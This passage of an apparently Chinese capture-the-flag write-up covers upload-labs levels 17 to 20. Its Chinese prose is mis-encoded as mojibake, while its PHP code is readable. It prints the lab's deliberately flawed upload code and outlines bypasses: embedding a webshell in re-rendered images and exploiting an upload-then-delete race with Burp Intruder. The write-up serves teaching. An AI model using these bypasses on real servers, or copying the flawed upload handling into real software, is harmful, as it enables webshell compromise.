æ–‡ä»¶çš„æ‰©å±•å</span><br>    <span class="hljs-variable">$fileext</span>= <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$filename</span>,<span class="hljs-string">&quot;.&quot;</span>),<span class="hljs-number">1</span>);<br><br>    <span class="hljs-comment">//åˆ¤æ–­æ–‡ä»¶åç¼€ä¸ç±»å‹ï¼Œåˆæ³•æ‰è¿›è¡Œä¸Šä¼ æ“ä½œ</span><br>    <span class="hljs-keyword">if</span>((<span class="hljs-variable">$fileext</span> == <span class="hljs-string">&quot;jpg&quot;</span>) &amp;&amp; (<span class="hljs-variable">$filetype</span>==<span class="hljs-string">&quot;image/jpeg&quot;</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$tmpname</span>,<span class="hljs-variable">$target_path</span>))&#123;<br>            <span class="hljs-comment">//ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡</span><br>            <span class="hljs-variable">$im</span> = <span class="hljs-title function_ invoke__">imagecreatefromjpeg</span>(<span class="hljs-variable">$target_path</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$im</span> == <span class="hljs-literal">false</span>)&#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;è¯¥æ–‡ä»¶ä¸æ˜¯jpgæ ¼å¼çš„å›¾ç‰‡ï¼&quot;</span>;<br>                @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$target_path</span>);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-comment">//ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å</span><br>                <span class="hljs-title function_ invoke__">srand</span>(<span class="hljs-title function_ invoke__">time</span>());<br>                <span class="hljs-variable">$newfilename</span> = <span class="hljs-title function_ invoke__">strval</span>(<span class="hljs-title function_ invoke__">rand</span>()).<span class="hljs-string">&quot;.jpg&quot;</span>;<br>                <span class="hljs-comment">//æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰</span><br>                <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$newfilename</span>;<br>                <span class="hljs-title function_ invoke__">imagejpeg</span>(<span class="hljs-variable">$im</span>,<span class="hljs-variable">$img_path</span>);<br>                @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$target_path</span>);<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;ä¸Šä¼ å‡ºé”™ï¼&quot;</span>;<br>        &#125;<br><br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>((<span class="hljs-variable">$fileext</span> == <span class="hljs-string">&quot;png&quot;</span>) &amp;&amp; (<span class="hljs-variable">$filetype</span>==<span class="hljs-string">&quot;image/png&quot;</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$tmpname</span>,<span class="hljs-variable">$target_path</span>))&#123;<br>            <span class="hljs-comment">//ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡</span><br>            <span class="hljs-variable">$im</span> = <span class="hljs-title function_ invoke__">imagecreatefrompng</span>(<span class="hljs-variable">$target_path</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$im</span> == <span class="hljs-literal">false</span>)&#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;è¯¥æ–‡ä»¶ä¸æ˜¯pngæ ¼å¼çš„å›¾ç‰‡ï¼&quot;</span>;<br>                @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$target_path</span>);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                 <span class="hljs-comment">//ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å</span><br>                <span class="hljs-title function_ invoke__">srand</span>(<span class="hljs-title function_ invoke__">time</span>());<br>                <span class="hljs-variable">$newfilename</span> = <span class="hljs-title function_ invoke__">strval</span>(<span class="hljs-title function_ invoke__">rand</span>()).<span class="hljs-string">&quot;.png&quot;</span>;<br>                <span class="hljs-comment">//æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰</span><br>                <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$newfilename</span>;<br>                <span class="hljs-title function_ invoke__">imagepng</span>(<span class="hljs-variable">$im</span>,<span class="hljs-variable">$img_path</span>);<br><br>                @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$target_path</span>);<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;               <br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;ä¸Šä¼ å‡ºé”™ï¼&quot;</span>;<br>        &#125;<br><br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>((<span class="hljs-variable">$fileext</span> == <span class="hljs-string">&quot;gif&quot;</span>) &amp;&amp; (<span class="hljs-variable">$filetype</span>==<span class="hljs-string">&quot;image/gif&quot;</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$tmpname</span>,<span class="hljs-variable">$target_path</span>))&#123;<br>            <span class="hljs-comment">//ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡</span><br>            <span class="hljs-variable">$im</span> = <span class="hljs-title function_ invoke__">imagecreatefromgif</span>(<span class="hljs-variable">$target_path</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$im</span> == <span class="hljs-literal">false</span>)&#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;è¯¥æ–‡ä»¶ä¸æ˜¯gifæ ¼å¼çš„å›¾ç‰‡ï¼&quot;</span>;<br>                @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$target_path</span>);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-comment">//ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å</span><br>                <span class="hljs-title function_ invoke__">srand</span>(<span class="hljs-title function_ invoke__">time</span>());<br>                <span class="hljs-variable">$newfilename</span> = <span class="hljs-title function_ invoke__">strval</span>(<span class="hljs-title function_ invoke__">rand</span>()).<span class="hljs-string">&quot;.gif&quot;</span>;<br>                <span class="hljs-comment">//æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰</span><br>                <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$newfilename</span>;<br>                <span class="hljs-title function_ invoke__">imagegif</span>(<span class="hljs-variable">$im</span>,<span class="hljs-variable">$img_path</span>);<br><br>                @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$target_path</span>);<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;ä¸Šä¼ å‡ºé”™ï¼&quot;</span>;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;åªå…è®¸ä¸Šä¼ åç¼€ä¸º.jpg|.png|.gifçš„å›¾ç‰‡æ–‡ä»¶ï¼&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>äºŒæ¬¡æ¸²æŸ“æ˜¯å°†åŸæ¥çš„å›¾ç‰‡å†…å®¹è½¬æ¢ä¸ºå¦ä¸€ç§å†…å®¹ï¼Œè¿™äº›å†…å®¹æœ‰ç›¸åŒä¹‹å¤„ä¹Ÿæœ‰ä¸åŒä¹‹å¤„ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨ç›¸åŒä¹‹å¤„åŠ å…¥ä¸€å¥è¯æœ¨é©¬å³å¯</p><p>é¦–å…ˆéšä¾¿ä¸Šä¼ ä¸€å¼ å›¾ç‰‡å¹¶æ‰¾åˆ°ï¼Œ</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021954160.png"></p><p>ä½¿ç”¨010æ¯”è¾ƒä¿©ä¸ªæ–‡ä»¶</p><p>æ’å…¥ä¸€å¥è¯æœ¨é©¬</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021954269.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021954569.png"></p><h3 id="Pass-18-æ¡ä»¶ç«äº‰"><a href="#Pass-18-æ¡ä»¶ç«äº‰" class="headerlink" title="Pass-18_æ¡ä»¶ç«äº‰"></a>Pass-18_æ¡ä»¶ç«äº‰</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$ext_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br>    <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>    <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$file_name</span>,<span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$file_name</span>,<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<br>    <span class="hljs-variable">$upload_file</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$file_name</span>;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$upload_file</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$ext_arr</span>))&#123;<br>             <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span>. <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;<br>             <span class="hljs-title function_ invoke__">rename</span>(<span class="hljs-variable">$upload_file</span>, <span class="hljs-variable">$img_path</span>);<br>             <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;</span>;<br>            <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$upload_file</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªä»£ç ä¸­å…ˆä¸Šä¼ åæ£€æŸ¥ï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä¸Šä¼ åˆ°åˆ é™¤ä¹‹é—´çš„æ—¶é—´å»è®¿é—®æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ï¼Œè¿™å°±æ˜¯æ¡ä»¶ç«äº‰ï¼ˆæ»¡è¶³ç‰¹å®šç¯å¢ƒæ¡ä»¶ï¼‰ã€‚</p><p>æ›´æ”¹ä¸€ä¸‹phpæ–‡ä»¶</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021954241.png"></p><p>å‘é€PHPä»£ç ï¼Œå¹¶ä¸”ç”¨BPæŠ“åŒ…<br>ç›´æ¥å‘é€åˆ°Intruderæ¨¡å—è¿›è¡Œæš´åŠ›é‡å‘</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021954810.png"></p><p>å‘é€è¿‡æ¥åç›´æ¥ç‚¹å‡»å³ä¾§æ¸…é™¤ï¼ˆcleanï¼‰ï¼Œç„¶åç‚¹å‡»ä¸Šæ–¹çš„Payloads,æŒ‰ç…§å¦‚ä¸‹è®¾ç½®</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021954989.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021955333.png"></p><p>æ¥ä¸‹æ¥å¼€å§‹æ”»å‡»ï¼Œç”¨å¦ä¸€ä¸ªæµè§ˆå™¨è®¿é—®ç”Ÿæˆæ–‡ä»¶åœ°å€</p><h3 id="Pass-19-æ¡ä»¶ç«äº‰-å›¾ç‰‡é©¬"><a href="#Pass-19-æ¡ä»¶ç«äº‰-å›¾ç‰‡é©¬" class="headerlink" title="Pass-19-æ¡ä»¶ç«äº‰+å›¾ç‰‡é©¬"></a>Pass-19-æ¡ä»¶ç«äº‰+å›¾ç‰‡é©¬</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//index.php</span><br><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))<br>&#123;<br>    <span class="hljs-keyword">require_once</span>(<span class="hljs-string">&quot;./myupload.php&quot;</span>);<br>    <span class="hljs-variable">$imgFileName</span> =<span class="hljs-title function_ invoke__">time</span>();<br>    <span class="hljs-variable">$u</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyUpload</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>], <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;size&#x27;</span>],<span class="hljs-variable">$imgFileName</span>);<br>    <span class="hljs-variable">$status_code</span> = <span class="hljs-variable">$u</span>-&gt;<span class="hljs-title function_ invoke__">upload</span>(UPLOAD_PATH);<br>    <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$status_code</span>) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            <span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$u</span>-&gt;cls_upload_dir . <span class="hljs-variable">$u</span>-&gt;cls_file_rename_to;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;æ–‡ä»¶å·²ç»è¢«ä¸Šä¼ ï¼Œä½†æ²¡æœ‰é‡å‘½åã€‚&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> -<span class="hljs-number">1</span>:<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;è¿™ä¸ªæ–‡ä»¶ä¸èƒ½ä¸Šä¼ åˆ°æœåŠ¡å™¨çš„ä¸´æ—¶æ–‡ä»¶å­˜å‚¨ç›®å½•ã€‚&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> -<span class="hljs-number">2</span>:<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸Šä¼ å¤±è´¥ï¼Œä¸Šä¼ ç›®å½•ä¸å¯å†™ã€‚&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> -<span class="hljs-number">3</span>:<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸Šä¼ å¤±è´¥ï¼Œæ— æ³•ä¸Šä¼ è¯¥ç±»å‹æ–‡ä»¶ã€‚&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> -<span class="hljs-number">4</span>:<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸Šä¼ å¤±è´¥ï¼Œä¸Šä¼ çš„æ–‡ä»¶è¿‡å¤§ã€‚&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> -<span class="hljs-number">5</span>:<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸Šä¼ å¤±è´¥ï¼ŒæœåŠ¡å™¨å·²ç»å­˜åœ¨ç›¸åŒåç§°æ–‡ä»¶ã€‚&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> -<span class="hljs-number">6</span>:<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;æ–‡ä»¶æ— æ³•ä¸Šä¼ ï¼Œæ–‡ä»¶ä¸èƒ½å¤åˆ¶åˆ°ç›®æ ‡ç›®å½•ã€‚&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;      <br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;æœªçŸ¥é”™è¯¯ï¼&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//myupload.php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyUpload</span></span>&#123;<br>......<br>......<br>...... <br>  <span class="hljs-keyword">var</span> <span class="hljs-variable">$cls_arr_ext_accepted</span> = <span class="hljs-keyword">array</span>(<br>      <span class="hljs-string">&quot;.doc&quot;</span>, <span class="hljs-string">&quot;.xls&quot;</span>, <span class="hljs-string">&quot;.txt&quot;</span>, <span class="hljs-string">&quot;.pdf&quot;</span>, <span class="hljs-string">&quot;.gif&quot;</span>, <span class="hljs-string">&quot;.jpg&quot;</span>, <span class="hljs-string">&quot;.zip&quot;</span>, <span class="hljs-string">&quot;.rar&quot;</span>, <span class="hljs-string">&quot;.7z&quot;</span>,<span class="hljs-string">&quot;.ppt&quot;</span>,<br>      <span class="hljs-string">&quot;.html&quot;</span>, <span class="hljs-string">&quot;.xml&quot;</span>, <span class="hljs-string">&quot;.tiff&quot;</span>, <span class="hljs-string">&quot;.jpeg&quot;</span>, <span class="hljs-string">&quot;.png&quot;</span> );<br><br>......<br>......<br>......  <br>  <span class="hljs-comment">/** upload()</span><br><span class="hljs-comment">   **</span><br><span class="hljs-comment">   ** Method to upload the file.</span><br><span class="hljs-comment">   ** This is the only method to call outside the class.</span><br><span class="hljs-comment">   ** <span class="hljs-doctag">@para</span> String name of directory we upload to</span><br><span class="hljs-comment">   ** <span class="hljs-doctag">@returns</span> void</span><br><span class="hljs-comment">  **/</span><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload</span>(<span class="hljs-params"> <span class="hljs-variable">$dir</span> </span>)</span>&#123;<br>    <br>    <span class="hljs-variable">$ret</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">isUploadedFile</span>();<br>    <br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$ret</span> != <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">resultUpload</span>( <span class="hljs-variable">$ret</span> );<br>    &#125;<br><br>    <span class="hljs-variable">$ret</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">setDir</span>( <span class="hljs-variable">$dir</span> );<br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$ret</span> != <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">resultUpload</span>( <span class="hljs-variable">$ret</span> );<br>    &#125;<br><br>    <span class="hljs-variable">$ret</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">checkExtension</span>();<br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$ret</span> != <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">resultUpload</span>( <span class="hljs-variable">$ret</span> );<br>    &#125;<br><br>    <span class="hljs-variable">$ret</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">checkSize</span>();<br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$ret</span> != <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">resultUpload</span>( <span class="hljs-variable">$ret</span> );    <br>    &#125;<br>    <br>    <span class="hljs-comment">// if flag to check if the file exists is set to 1</span><br>    <br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable language_">$this</span>-&gt;cls_file_exists == <span class="hljs-number">1</span> )&#123;<br>      <br>      <span class="hljs-variable">$ret</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">checkFileExists</span>();<br>      <span class="hljs-keyword">if</span>( <span class="hljs-variable">$ret</span> != <span class="hljs-number">1</span> )&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">resultUpload</span>( <span class="hljs-variable">$ret</span> );    <br>      &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// if we are here, we are ready to move the file to destination</span><br><br>    <span class="hljs-variable">$ret</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">move</span>();<br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$ret</span> != <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">resultUpload</span>( <span class="hljs-variable">$ret</span> );    <br>    &#125;<br><br>    <span class="hljs-comment">// check if we need to rename the file</span><br><br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable language_">$this</span>-&gt;cls_rename_file == <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-variable">$ret</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">renameFile</span>();<br>      <span class="hljs-keyword">if</span>( <span class="hljs-variable">$ret</span> != <span class="hljs-number">1</span> )&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">resultUpload</span>( <span class="hljs-variable">$ret</span> );    <br>      &#125;<br>    &#125;<br>    <br>    <span class="hljs-comment">// if we are here, everything worked as planned :)</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">resultUpload</span>( <span class="hljs-string">&quot;SUCCESS&quot;</span> );<br>  <br>  &#125;<br>......<br>......<br>...... <br>&#125;;<br></code></pre></td></tr></table></figure><p>19å…³ä¸18å…³ç›¸æ¯”ï¼ŒåŠ å…¥äº†å›¾ç‰‡é©¬</p><p>åœ¨å›¾ç‰‡æœ«å°¾åŠ å…¥æœ¨é©¬</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021955594.png"></p><p>ä¸Šä¼ å›¾ç‰‡å¹¶ç”¨bpæŠ“åŒ…</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021955741.png"></p><p>æ¥ä¸‹æ¥åŒ18å…³</p><h3 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span 